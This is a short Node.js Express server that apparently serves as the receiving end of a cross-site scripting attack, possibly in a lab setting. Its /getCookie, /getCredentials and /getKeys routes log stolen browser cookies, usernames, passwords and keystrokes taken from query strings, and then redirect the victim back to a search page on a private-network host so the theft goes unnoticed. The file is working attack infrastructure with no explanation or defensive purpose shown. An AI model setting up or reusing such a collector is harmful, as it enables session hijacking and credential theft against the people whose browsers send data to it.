const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.get('/getCookie', (req, res) => {
  console.log('document.cookie: ', req.query.cookie);
  res.redirect('http://192.168.x.3:8090/search?term=dog');
});

app.get('/getCredentials', (req, res) => {
  console.log('username: ', req.query.username);
  console.log('password: ', req.query.password);
  res.redirect('http://192.168.x.3:8090/search?term=dog');
});

app.get('/getKeys', (req, res) => {
  console.log('keys: ', req.query.keys);
});

app.listen(port, () => console.log(`Example app listening on port ${port}!`))